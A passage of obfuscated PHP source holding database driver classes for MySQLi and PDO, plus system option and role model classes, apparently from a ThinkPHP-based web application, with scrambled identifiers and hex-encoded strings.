$•ŞÀ ßœâïàĞ = $¿²ŒÑôÕ[383] . trim($•ŞÀ ßœâïàĞ, $¿²ŒÑôÕ[383]) . $¿²ŒÑôÕ[383]; } return $•ŞÀ ßœâïàĞ; } } class DbMysqli extends Db { public function __construct($•İ×Ñ¦½‘¢ = '') { $Çˆ =& $_SERVER[èÍ×öˆøÉ]; if (!extension_loaded($Çˆ[795])) { think_exception(think_lang($Çˆ[10]) . $Çˆ[912]); } if (!empty($•İ×Ñ¦½‘¢)) { $this->config = $•İ×Ñ¦½‘¢; if (empty($this->config[$Çˆ[13]])) { $this->config[$Çˆ[13]] = $Çˆ[33]; } } } public function connect($¬¡ = '', $¶‹Æ¸’”èÂä = 0) { $ıàœ€¨ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->linkID[$¶‹Æ¸’”èÂä])) { if (empty($¬¡)) { $¬¡ = $this->config; } $this->linkID[$¶‹Æ¸’”èÂä] = new mysqli($¬¡[$ıàœ€¨[886]], $¬¡[$ıàœ€¨[888]], $¬¡[$ıàœ€¨[889]], $¬¡[$ıàœ€¨[17]], $¬¡[$ıàœ€¨[887]] ? intval($¬¡[$ıàœ€¨[887]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ëî¦Ñ“¹‡º = $this->linkID[$¶‹Æ¸’”èÂä]->server_version; $this->linkID[$¶‹Æ¸’”èÂä]->query($ıàœ€¨[890] . think_config($ıàœ€¨[891]) . $ıàœ€¨[55]); if ($Ëî¦Ñ“¹‡º > $ıàœ€¨[892]) { $this->linkID[$¶‹Æ¸’”èÂä]->query($ıàœ€¨[893]); } $this->connected = !0; if (1 != think_config($ıàœ€¨[18])) { unset($this->config); } } return $this->linkID[$¶‹Æ¸’”èÂä]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($») { $Ÿş =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $»; if ($this->queryID) { $this->free(); } think_action_status($Ÿş[19], 1); think_status($Ÿş[20]); $this->queryID = $this->_linkID->query($»); if ($this->_linkID->more_results()) { while (($ä‰ ¢¾² = $this->_linkID->next_result()) != NULL) { $ä‰ ¢¾²->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($şÖŸï) { $èÌÅßĞ”³Ù„Å =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $şÖŸï; if ($this->queryID) { $this->free(); } think_action_status($èÌÅßĞ”³Ù„Å[21], 1); think_status($èÌÅßĞ”³Ù„Å[20]); $ô†ê°Àö€ = $this->_linkID->query($şÖŸï); $this->debug(); if (!1 === $ô†ê°Àö€) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $«†³çÜç¨é‘ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$«†³çÜç¨é‘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â¢ùòÃ¼Ø = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Â¢ùòÃ¼Ø) { $this->error(); return !1; } } return !0; } private function getAll() { $æ©àõöñçÚö¾ = array(); if ($this->numRows > 0) { for ($÷Ó³ŠÂ = 0; $÷Ó³ŠÂ < $this->numRows; $÷Ó³ŠÂ++) { $æ©àõöñçÚö¾[$÷Ó³ŠÂ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $æ©àõöñçÚö¾; } public function getFields($Ìªò·ñ) { $ÂÇ¢ï¸ =& $_SERVER[èÍ×öˆøÉ]; $ºÉª = $this->query($ÂÇ¢ï¸[897] . $this->parseKey($Ìªò·ñ)); $¾×àË¼ƒ«Ä = array(); if ($ºÉª) { foreach ($ºÉª as $¹ı·õ¹ã¯ => $ÉÂ) { $¾×àË¼ƒ«Ä[$ÉÂ[$ÂÇ¢ï¸[27]]] = array($ÂÇ¢ï¸[28] => $ÉÂ[$ÂÇ¢ï¸[27]], $ÂÇ¢ï¸[29] => $ÉÂ[$ÂÇ¢ï¸[30]], $ÂÇ¢ï¸[31] => (bool) ($ÉÂ[$ÂÇ¢ï¸[32]] === $ÂÇ¢ï¸[33]), $ÂÇ¢ï¸[34] => $ÉÂ[$ÂÇ¢ï¸[35]], $ÂÇ¢ï¸[36] => strtolower($ÉÂ[$ÂÇ¢ï¸[37]]) == $ÂÇ¢ï¸[38], $ÂÇ¢ï¸[39] => strtolower($ÉÂ[$ÂÇ¢ï¸[40]]) == $ÂÇ¢ï¸[41]); } } return $¾×àË¼ƒ«Ä; } public function getTables($ş¾ı”± = '') { $Áë´„ =& $_SERVER[èÍ×öˆøÉ]; $ßæ’ = !empty($ş¾ı”±) ? $Áë´„[899] . $ş¾ı”± . $Áë´„[900] : $Áë´„[901]; $âü® = $this->query($ßæ’); $¯ÎµÒ = array(); if ($âü®) { foreach ($âü® as $øì => $¦šôÙ›¶) { $¯ÎµÒ[$øì] = current($¦šôÙ›¶); } } return $¯ÎµÒ; } public function replace($œ±Üˆèƒ±¢Ç, $å¥Èˆ·ö¹ = array()) { $™˜àÚ´¬š„ =& $_SERVER[èÍ×öˆøÉ]; foreach ($œ±Üˆèƒ±¢Ç as $ÑˆÊ => $Ã£¨–Ô) { $Êñö = $this->parseValue($Ã£¨–Ô); if (is_scalar($Êñö)) { $ì©¤–Š­Ú[] = $Êñö; $¤úÙíşá´µ¡ê[] = $this->parseKey($ÑˆÊ); } } $†½ = $™˜àÚ´¬š„[902] . $this->parseTable($å¥Èˆ·ö¹[$™˜àÚ´¬š„[277]]) . $™˜àÚ´¬š„[903] . implode($™˜àÚ´¬š„[47], $¤úÙíşá´µ¡ê) . $™˜àÚ´¬š„[904] . implode($™˜àÚ´¬š„[47], $ì©¤–Š­Ú) . $™˜àÚ´¬š„[905]; return $this->execute($†½); } public function insertAll($¦ÌÄö Üµ¥Òº, $ó¶öˆ¶Ùó = array(), $Æ¾Ñú‘ = false) { $¦ŸÉ¦ =& $_SERVER[èÍ×öˆøÉ]; if (!is_array($¦ÌÄö Üµ¥Òº[0])) { return !1; } $îŸÅ‰õÜÙ¥ä = array_keys($¦ÌÄö Üµ¥Òº[0]); $’Ş‡„Ö”ÆŠŸ‚ = array(); foreach ($¦ÌÄö Üµ¥Òº as $ñìšÁ) { $˜şÔäı„• = array(); foreach ($ñìšÁ as $ÆÄä¦Œ† => $Óß£›’¤Ø—) { $Óß£›’¤Ø— = $this->parseValue($Óß£›’¤Ø—); if (is_scalar($Óß£›’¤Ø—)) { $˜şÔäı„•[] = $Óß£›’¤Ø—; } } $’Ş‡„Ö”ÆŠŸ‚[] = $¦ŸÉ¦[258] . implode($¦ŸÉ¦[47], $˜şÔäı„•) . $¦ŸÉ¦[905]; } array_walk($îŸÅ‰õÜÙ¥ä, array($this, $¦ŸÉ¦[906])); $‰š‚É¦Üë• = $Æ¾Ñú‘ ? $¦ŸÉ¦[907] : $¦ŸÉ¦[908]; $Şƒş‹Û¾ = $‰š‚É¦Üë• . $¦ŸÉ¦[909] . $this->parseTable($ó¶öˆ¶Ùó[$¦ŸÉ¦[277]]) . $¦ŸÉ¦[903] . implode($¦ŸÉ¦[47], $îŸÅ‰õÜÙ¥ä) . $¦ŸÉ¦[910] . implode($¦ŸÉ¦[47], $’Ş‡„Ö”ÆŠŸ‚); return $this->execute($Şƒş‹Û¾); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $µèˆñïÁ€Ìï =& $_SERVER[èÍ×öˆøÉ]; $this->error = $this->_linkID->errno . $µèˆñïÁ€Ìï[4] . $this->_linkID->error; if ($µèˆñïÁ€Ìï[33] != $this->queryStr) { $this->error .= LNG($µèˆñïÁ€Ìï[45]) . $this->queryStr; } think_trace($this->error, $µèˆñïÁ€Ìï[33], $µèˆñïÁ€Ìï[46]); return $this->error; } public function escapeString($‘óüæ´³À¶) { if ($this->_linkID) { return $this->_linkID->real_escape_string($‘óüæ´³À¶); } else { return addslashes($‘óüæ´³À¶); } } public function parseKey(&$³í, $ş€î³ = true) { $†®¢ =& $_SERVER[èÍ×öˆøÉ]; if ($ş€î³) { $³í = $this->parseKeyCheck($³í); } if ($³í != $†®¢[182] && !preg_match($†®¢[911], $³í)) { $³í = $†®¢[383] . trim($³í, $†®¢[383]) . $†®¢[383]; } return $³í; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ş§ĞİøïöÈäÖ = '') { $®ˆÑ­ÃÛºØê =& $_SERVER[èÍ×öˆøÉ]; if (!class_exists($®ˆÑ­ÃÛºØê[913])) { think_exception(think_lang($®ˆÑ­ÃÛºØê[10]) . $®ˆÑ­ÃÛºØê[914]); } if (!empty($ş§ĞİøïöÈäÖ)) { $this->config = $ş§ĞİøïöÈäÖ; if (empty($this->config[$®ˆÑ­ÃÛºØê[13]])) { $this->config[$®ˆÑ­ÃÛºØê[13]] = array(); } } } public function connect($•ïÁ¸æ = '', $¤ï§õ = 0) { $Æª›µÒ¦£„ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->linkID[$¤ï§õ])) { if (empty($•ïÁ¸æ)) { $•ïÁ¸æ = $this->config; } $‚‰ = !empty($•ïÁ¸æ[$Æª›µÒ¦£„[13]][$Æª›µÒ¦£„[14]]) ? $•ïÁ¸æ[$Æª›µÒ¦£„[13]][$Æª›µÒ¦£„[14]] : $this->pconnect; if ($‚‰) { $•ïÁ¸æ[$Æª›µÒ¦£„[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¤ï§õ] = new PDO($•ïÁ¸æ[$Æª›µÒ¦£„[915]], $•ïÁ¸æ[$Æª›µÒ¦£„[888]], $•ïÁ¸æ[$Æª›µÒ¦£„[889]], $•ïÁ¸æ[$Æª›µÒ¦£„[13]]); } catch (PDOException $©Ò¿‹) { think_exception($©Ò¿‹->getMessage()); } $this->dbType = $this->_getDsnType($•ïÁ¸æ[$Æª›µÒ¦£„[915]]); if (in_array($this->dbType, array($Æª›µÒ¦£„[916], $Æª›µÒ¦£„[917], $Æª›µÒ¦£„[918], $Æª›µÒ¦£„[919]))) { think_exception($Æª›µÒ¦£„[920] . $this->dbType . $Æª›µÒ¦£„[921] . $this->dbType . $Æª›µÒ¦£„[922]); } if (!$this->linkID[$¤ï§õ]) { think_exception($Æª›µÒ¦£„[923]); } try { $this->linkID[$¤ï§õ]->exec($Æª›µÒ¦£„[924] . think_config($Æª›µÒ¦£„[891])); } catch (Exception $©Ò¿‹) { } $this->connected = !0; if (1 != think_config($Æª›µÒ¦£„[18])) { unset($this->config); } } return $this->linkID[$¤ï§õ]; } public function free() { $this->PDOStatement = null; } public function query($è, $âİ×Â¡É = array()) { $ëëŠ =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $è; if (!empty($âİ×Â¡É)) { $this->queryStr .= $ëëŠ[925] . print_r($âİ×Â¡É, !0) . $ëëŠ[926]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ëëŠ[19], 1); think_status($ëëŠ[20]); $this->PDOStatement = $this->_linkID->prepare($è); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $öƒñ = $this->PDOStatement->execute($âİ×Â¡É); $this->debug(); if (!1 === $öƒñ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($´åúá™„¿, $šÄşô³ãŸó = array()) { $ˆ­á“ª =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $´åúá™„¿; if (!empty($šÄşô³ãŸó)) { $this->queryStr .= $ˆ­á“ª[925] . print_r($šÄşô³ãŸó, !0) . $ˆ­á“ª[926]; } $Èû = !1; if ($this->dbType == $ˆ­á“ª[919]) { if (preg_match($ˆ­á“ª[927], $this->queryStr, $Ü ›ªÛ§Í®é)) { $this->table = think_config($ˆ­á“ª[928]) . str_ireplace(think_config($ˆ­á“ª[929]), $ˆ­á“ª[376], $Ü ›ªÛ§Í®é[2]); $Èû = (bool) $this->query($ˆ­á“ª[930] . strtoupper($this->table) . $ˆ­á“ª[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ˆ­á“ª[21], 1); think_status($ˆ­á“ª[20]); $this->PDOStatement = $this->_linkID->prepare($´åúá™„¿); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $©Éœã÷ê³ê¸ = $this->PDOStatement->execute($šÄşô³ãŸó); $this->debug(); if (!1 === $©Éœã÷ê³ê¸) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Èû || preg_match($ˆ­á“ª[931], $´åúá™„¿)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $™§»—· = $this->_linkID->commit(); $this->transTimes = 0; if (!$™§»—·) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú¡ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ú¡) { $this->error(); return !1; } } return !0; } private function getAll() { $•ú = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($•ú); return $•ú; } public function getFields($ß») { $œ³³ÃÄ…û¿ =& $_SERVER[èÍ×öˆøÉ]; $this->initConnect(!0); if (think_config($œ³³ÃÄ…û¿[932])) { $ú×ì¤½èÒÏğ = str_replace($œ³³ÃÄ…û¿[933], $ß», think_config($œ³³ÃÄ…û¿[932])); } else { switch ($this->dbType) { case $œ³³ÃÄ…û¿[916]: case $œ³³ÃÄ…û¿[934]: $ú×ì¤½èÒÏğ = "\x53\105\114\x45\x43\x54\x20\40\40\143\x6f\x6c\165\x6d\x6e\137\156\141\x6d\145\x20\141\163\x20\47\116\x61\x6d\145\x27\x2c\40\x20\x20\144\x61\x74\141\x5f\164\x79\x70\145\40\x61\x73\40\x27\x54\171\160\x65\x27\54\40\x20\x20\143\x6f\154\165\155\x6e\137\x64\145\146\141\x75\154\164\40\141\163\x20\47\x44\x65\x66\141\165\154\164\x27\x2c\x20\40\40\x69\163\x5f\x6e\x75\x6c\154\141\x62\x6c\x65\40\141\x73\40\x27\116\165\x6c\x6c\47\12\x9\11\106\x52\117\115\11\x69\156\x66\x6f\x72\155\141\164\x69\x6f\x6e\137\163\143\150\145\x6d\x61\56\x74\x61\142\154\x65\x73\40\x41\123\40\164\12\11\11\x4a\x4f\111\x4e\11\x69\x6e\x66\x6f\162\x6d\x61\164\151\157\x6e\137\163\x63\150\x65\x6d\141\x2e\143\157\x6c\x75\x6d\x6e\163\40\x41\123\40\x63\12\x9\11\117\x4e\40\x20\x74\x2e\x74\x61\x62\x6c\145\137\143\141\164\141\x6c\x6f\147\40\x3d\x20\x63\56\164\x61\142\154\x65\x5f\143\x61\164\141\x6c\157\147\xa\11\x9\101\x4e\x44\x20\x74\x2e\x74\141\142\x6c\x65\x5f\163\x63\150\145\155\141\40\x3d\40\143\56\x74\141\x62\x6c\x65\137\163\143\150\145\155\x61\12\x9\x9\x41\116\104\40\164\x2e\x74\141\142\154\145\137\x6e\x61\155\x65\40\x3d\40\143\x2e\x74\x61\x62\154\x65\x5f\x6e\x61\155\x65\xa\x9\11\x57\x48\105\x52\x45\40\40\40\x74\56\164\141\142\x6c\145\x5f\156\141\155\145\40\x3d\40\x27{$ß»}\x27"; break; case $œ³³ÃÄ…û¿[935]: $ú×ì¤½èÒÏğ = $œ³³ÃÄ…û¿[936] . $ß» . $œ³³ÃÄ…û¿[937]; break; case $œ³³ÃÄ…û¿[917]: case $œ³³ÃÄ…û¿[919]: $ú×ì¤½èÒÏğ = $œ³³ÃÄ…û¿[938] . $œ³³ÃÄ…û¿[939] . $œ³³ÃÄ…û¿[940] . strtoupper($ß») . $œ³³ÃÄ…û¿[941] . strtoupper($ß») . $œ³³ÃÄ…û¿[942]; break; case $œ³³ÃÄ…û¿[943]: $ú×ì¤½èÒÏğ = $œ³³ÃÄ…û¿[944] . $ß» . $œ³³ÃÄ…û¿[945]; break; case $œ³³ÃÄ…û¿[918]: break; case $œ³³ÃÄ…û¿[946]: default: $ú×ì¤½èÒÏğ = $œ³³ÃÄ…û¿[947] . ($this->dbType == $œ³³ÃÄ…û¿[946] ? "\140{$ß»}\140" : $ß»); } } $È‡õ°µ•Ì†Î = $this->query($ú×ì¤½èÒÏğ); $‘»ªäüš®€ = array(); if ($È‡õ°µ•Ì†Î) { foreach ($È‡õ°µ•Ì†Î as $×‘ıš¶´âÎ”Ó => $â“) { $â“ = array_change_key_case($â“); $â“[$œ³³ÃÄ…û¿[28]] = isset($â“[$œ³³ÃÄ…û¿[28]]) ? $â“[$œ³³ÃÄ…û¿[28]] : $œ³³ÃÄ…û¿[376]; $â“[$œ³³ÃÄ…û¿[29]] = isset($â“[$œ³³ÃÄ…û¿[29]]) ? $â“[$œ³³ÃÄ…û¿[29]] : $œ³³ÃÄ…û¿[376]; $ïœ¬Ñµ× = isset($â“[$œ³³ÃÄ…û¿[271]]) ? $â“[$œ³³ÃÄ…û¿[271]] : $â“[$œ³³ÃÄ…û¿[28]]; $‘»ªäüš®€[$ïœ¬Ñµ×] = array($œ³³ÃÄ…û¿[28] => $ïœ¬Ñµ×, $œ³³ÃÄ…û¿[29] => $â“[$œ³³ÃÄ…û¿[29]], $œ³³ÃÄ…û¿[31] => (bool) (isset($â“[$œ³³ÃÄ…û¿[103]]) && $â“[$œ³³ÃÄ…û¿[103]] === $œ³³ÃÄ…û¿[33] || isset($â“[$œ³³ÃÄ…û¿[31]]) && $â“[$œ³³ÃÄ…û¿[31]] === $œ³³ÃÄ…û¿[33]), $œ³³ÃÄ…û¿[34] => isset($â“[$œ³³ÃÄ…û¿[34]]) ? $â“[$œ³³ÃÄ…û¿[34]] : (isset($â“[$œ³³ÃÄ…û¿[53]]) ? $â“[$œ³³ÃÄ…û¿[53]] : $œ³³ÃÄ…û¿[376]), $œ³³ÃÄ…û¿[36] => isset($â“[$œ³³ÃÄ…û¿[93]]) ? strtolower($â“[$œ³³ÃÄ…û¿[93]]) == $œ³³ÃÄ…û¿[38] : (isset($â“[$œ³³ÃÄ…û¿[54]]) ? $â“[$œ³³ÃÄ…û¿[54]] : !1), $œ³³ÃÄ…û¿[39] => isset($â“[$œ³³ÃÄ…û¿[948]]) ? strtolower($â“[$œ³³ÃÄ…û¿[948]]) == $œ³³ÃÄ…û¿[41] : (isset($â“[$œ³³ÃÄ…û¿[93]]) ? $â“[$œ³³ÃÄ…û¿[93]] : !1)); } } return $‘»ªäüš®€; } public function getTables($»÷ëÃ¼òèø = '') { $Û£Á =& $_SERVER[èÍ×öˆøÉ]; if (think_config($Û£Á[949])) { $¹§ğò = str_replace($Û£Á[950], $»÷ëÃ¼òèø, think_config($Û£Á[949])); } else { switch ($this->dbType) { case $Û£Á[917]: case $Û£Á[919]: $¹§ğò = $Û£Á[951]; break; case $Û£Á[916]: case $Û£Á[934]: $¹§ğò = $Û£Á[952]; break; case $Û£Á[943]: $¹§ğò = $Û£Á[953]; break; case $Û£Á[918]: think_exception(think_lang($Û£Á[954]) . $Û£Á[955]); break; case $Û£Á[935]: $¹§ğò = $Û£Á[42] . $Û£Á[43] . $Û£Á[44]; break; case $Û£Á[946]: default: if (!empty($»÷ëÃ¼òèø)) { $¹§ğò = $Û£Á[899] . $»÷ëÃ¼òèø . $Û£Á[900]; } else { $¹§ğò = $Û£Á[901]; } } } $ÈµúÄœÔîŒ = $this->query($¹§ğò); $œõùœ‘ ˜ÛÒ = array(); foreach ($ÈµúÄœÔîŒ as $Ì×ú => $»¹Ä«›á¦„ù) { $œõùœ‘ ˜ÛÒ[$Ì×ú] = current($»¹Ä«›á¦„ù); } return $œõùœ‘ ˜ÛÒ; } protected function parseLimit($©Š) { $•™¯€ú =& $_SERVER[èÍ×öˆøÉ]; $¢’Ä¥öÅ·ò˜ = $•™¯€ú[33]; if (!empty($©Š)) { switch ($this->dbType) { case $•™¯€ú[943]: case $•™¯€ú[935]: $©Š = explode($•™¯€ú[47], $©Š); if (count($©Š) > 1) { $¢’Ä¥öÅ·ò˜ .= $•™¯€ú[48] . $©Š[1] . $•™¯€ú[49] . $©Š[0] . $•™¯€ú[50]; } else { $¢’Ä¥öÅ·ò˜ .= $•™¯€ú[48] . $©Š[0] . $•™¯€ú[50]; } break; case $•™¯€ú[916]: case $•™¯€ú[934]: break; case $•™¯€ú[918]: break; case $•™¯€ú[917]: case $•™¯€ú[919]: break; case $•™¯€ú[946]: default: $¢’Ä¥öÅ·ò˜ .= $•™¯€ú[48] . $©Š . $•™¯€ú[50]; } } return $¢’Ä¥öÅ·ò˜; } public function parseKey(&$‡‹‚Šé½‰Âí, $ò„­· = true) { $ÄÑ =& $_SERVER[èÍ×öˆøÉ]; if ($ò„­·) { $‡‹‚Šé½‰Âí = $this->parseKeyCheck($‡‹‚Šé½‰Âí); } if ($this->dbType == $ÄÑ[946]) { if ($‡‹‚Šé½‰Âí != $ÄÑ[182] && !preg_match($ÄÑ[911], $‡‹‚Šé½‰Âí)) { $‡‹‚Šé½‰Âí = $ÄÑ[383] . trim($‡‹‚Šé½‰Âí, $ÄÑ[383]) . $ÄÑ[383]; } return $‡‹‚Šé½‰Âí; } else { return parent::parseKey($‡‹‚Šé½‰Âí, $ò„­·); } } public function close() { $this->_linkID = null; } public function error() { $Ôİ =& $_SERVER[èÍ×öˆøÉ]; if ($this->PDOStatement) { $«¼ë”®Õ†™ = $this->PDOStatement->errorInfo(); $this->error = $«¼ë”®Õ†™[1] . $Ôİ[4] . $«¼ë”®Õ†™[2]; } else { $this->error = $Ôİ[33]; } if ($Ôİ[33] != $this->queryStr) { $this->error .= LNG($Ôİ[45]) . $this->queryStr; } think_trace($this->error, $Ôİ[33], $Ôİ[46]); return $this->error; } public function escapeString($È¡şÜ¾ºğ) { $˜İê³ëÁÒ =& $_SERVER[èÍ×öˆøÉ]; switch ($this->dbType) { case $˜İê³ëÁÒ[943]: case $˜İê³ëÁÒ[916]: case $˜İê³ëÁÒ[934]: case $˜İê³ëÁÒ[946]: return addslashes($È¡şÜ¾ºğ); case $˜İê³ëÁÒ[918]: case $˜İê³ëÁÒ[935]: case $˜İê³ëÁÒ[917]: case $˜İê³ëÁÒ[919]: return str_ireplace($˜İê³ëÁÒ[55], $˜İê³ëÁÒ[56], $È¡şÜ¾ºğ); } } protected function parseValue($‡Ï±’°) { $šæ¶Íº…Áá =& $_SERVER[èÍ×öˆøÉ]; if (is_string($‡Ï±’°)) { $—ıÄÎ = strpos($‡Ï±’°, $šæ¶Íº…Áá[4]) === 0 && in_array($‡Ï±’°, array_keys($this->bind)); $‡Ï±’° = $—ıÄÎ ? $this->escapeString($‡Ï±’°) : $šæ¶Íº…Áá[956] . $this->escapeString($‡Ï±’°) . $šæ¶Íº…Áá[956]; } elseif (isset($‡Ï±’°[0]) && is_string($‡Ï±’°[0]) && strtolower($‡Ï±’°[0]) == $šæ¶Íº…Áá[295]) { $‡Ï±’° = $this->escapeString($‡Ï±’°[1]); } elseif (is_array($‡Ï±’°)) { $‡Ï±’° = array_map(array($this, $šæ¶Íº…Áá[957]), $‡Ï±’°); } elseif (is_bool($‡Ï±’°)) { $‡Ï±’° = $‡Ï±’° ? $šæ¶Íº…Áá[87] : $šæ¶Íº…Áá[191]; } elseif (is_null($‡Ï±’°)) { $‡Ï±’° = $šæ¶Íº…Áá[103]; } return $‡Ï±’°; } public function getLastInsertId() { $µ²± =& $_SERVER[èÍ×öˆøÉ]; switch ($this->dbType) { case $µ²±[943]: case $µ²±[935]: case $µ²±[916]: case $µ²±[934]: case $µ²±[918]: case $µ²±[946]: return $this->_linkID->lastInsertId(); case $µ²±[917]: case $µ²±[919]: $äÏ = $this->table; $„ËÓÇ = $this->query("\x53\x45\x4c\x45\103\x54\x20{$äÏ}\56\x63\165\162\162\x76\x61\154\x20\143\165\162\162\166\141\x6c\40\x46\122\x4f\x4d\x20\144\165\141\x6c"); return $„ËÓÇ ? $„ËÓÇ[0][$µ²±[958]] : 0; } } } goto A½°‹·‹ãÎ; CŒµŞ¡ÚŞœ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\137\157\160\164\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\145", "\x72\157\154\145\x47\x72\157\x75\160", "\162\x65\147\151\x73\164", "\145\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ãÈÄÌ†¾ãÑ§) { return "\x53\x79\x73\164\x65\x6d\x4f\x70\x74\x69\157\x6e\x5f{$ãÈÄÌ†¾ãÑ§}"; } protected function optionDefault($Ö»æ£³×½ï = '') { $ª§—Œ =& $_SERVER[èÍ×öˆøÉ]; if ($Ö»æ£³×½ï == $ª§—Œ[33]) { return $GLOBALS[$ª§—Œ[6]][$ª§—Œ[379]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x72\x6f\154\x65\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\x6c\141\x62\145\x6c", "\x64\151\163\x70\x6c\x61\x79", "\x73\171\163\x74\145\x6d", "\x64\145\x73\143", "\151\147\156\x6f\x72\145\x45\170\164", "\151\147\156\157\x72\x65\106\151\154\145\123\151\172\145", "\x61\x64\x6d\x69\156\151\x73\164\x72\x61\x74\x6f\162", "\163\x6f\x72\x74"); public function listData($¼ğ°İşëûÎÈŞ = false, $ÄáÔÅæÑ¯—ÑÀ = "\x73\x6f\162\x74", $ğ¦İãò£´ = false) { $Â²‹Ê±±¬ =& $_SERVER[èÍ×öˆøÉ]; $™è¥äø = parent::listData($¼ğ°İşëûÎÈŞ, $ÄáÔÅæÑ¯—ÑÀ, $ğ¦İãò£´); if (!$¼ğ°İşëûÎÈŞ) { foreach ($™è¥äø as $é™ => $ĞÀÉ) { if ($ĞÀÉ[$Â²‹Ê±±¬[1944]] == 1) { $™è¥äø[$é™][$Â²‹Ê±±¬[445]] = LNG($Â²‹Ê±±¬[2168]); } } } return $™è¥äø; } public function update($”‘ëæî÷¢®£¶, $Î°ô) { $ŒÌ´¤‚ =& $_SERVER[èÍ×öˆøÉ]; $Ò‘ = parent::listData($”‘ëæî÷¢®£¶); $…Ğ§“Ğ = $this->findByName($Î°ô[$ŒÌ´¤‚[28]]); if (!$Ò‘ || $…Ğ§“Ğ && $…Ğ§“Ğ[$ŒÌ´¤‚[395]] != $Ò‘[$ŒÌ´¤‚[395]]) { return !1; } if ($…Ğ§“Ğ[$ŒÌ´¤‚[1944]] == 1) { $Î°ô = array($ŒÌ´¤‚[28] => $Î°ô[$ŒÌ´¤‚[28]], $ŒÌ´¤‚[1771] => $Î°ô[$ŒÌ´¤‚[1771]]); } $this->filterAuth($Î°ô[$ŒÌ´¤‚[408]]); return parent::update($”‘ëæî÷¢®£¶, $Î°ô); } public function remove($ƒÍ‰úéß¬µØü) { $×ˆ = parent::listData($ƒÍ‰úéß¬µØü); if (!$×ˆ || $×ˆ[$_SERVER[èÍ×öˆøÉ][1209]]) { return !1; } return parent::remove($ƒÍ‰úéß¬µØü); } public function add($•ÕŒÓĞß§Á) { $¤Œ¶Ğ =& $_SERVER[èÍ×öˆøÉ]; $åâŠÎÙÚ‘ñÑá = $•ÕŒÓĞß§Á[$¤Œ¶Ğ[28]]; if ($this->findByName($åâŠÎÙÚ‘ñÑá)) { return !1; } $ùÛÕê’‡ = array($¤Œ¶Ğ[415] => $åâŠÎÙÚ‘ñÑá, $¤Œ¶Ğ[1755] => $¤Œ¶Ğ[33], $¤Œ¶Ğ[1751] => $¤Œ¶Ğ[1759], $¤Œ¶Ğ[2169] => 1, $¤Œ¶Ğ[1754] => 0, $¤Œ¶Ğ[2170] => 0, $¤Œ¶Ğ[1753] => $this->getSort()); $•ÕŒÓĞß§Á = array_merge($ùÛÕê’‡, $•ÕŒÓĞß§Á); $this->filterAuth($•ÕŒÓĞß§Á[$¤Œ¶Ğ[408]]); return parent::insert($•ÕŒÓĞß§Á); } private function getSort() { $¯³È½‚ÚŒõ =& $_SERVER[èÍ×öˆøÉ]; $£ÅØ«ƒ¯í = parent::listData(); $²ƒÏ = array_to_keyvalue($£ÅØ«ƒ¯í, $¯³È½‚ÚŒõ[33], $¯³È½‚ÚŒõ[1772]); return empty($²ƒÏ) ? 0 : max($²ƒÏ) + 1; } private function filterAuth(&$ÈÔ¹¦÷ô) { $ö–Ğüİ·±ÉÌÚ =& $_SERVER[èÍ×öˆøÉ]; $ü—ßÈ«·ıŒ = array(); $¤ã§…Ë = array_filter(explode($ö–Ğüİ·±ÉÌÚ[47], $ÈÔ¹¦÷ô)); foreach ($¤ã§…Ë as $ÈÔ¹¦÷ô) { $†Ú½è£” = explode($ö–Ğüİ·±ÉÌÚ[95], $ÈÔ¹¦÷ô); if ($†Ú½è£”[0] == $ö–Ğüİ·±ÉÌÚ[2171] && $†Ú½è£”[1] != $ö–Ğüİ·±ÉÌÚ[1128]) { $Âûå = $†Ú½è£”[0] . $ö–Ğüİ·±ÉÌÚ[95] . $†Ú½è£”[1] . $ö–Ğüİ·±ÉÌÚ[2172]; if 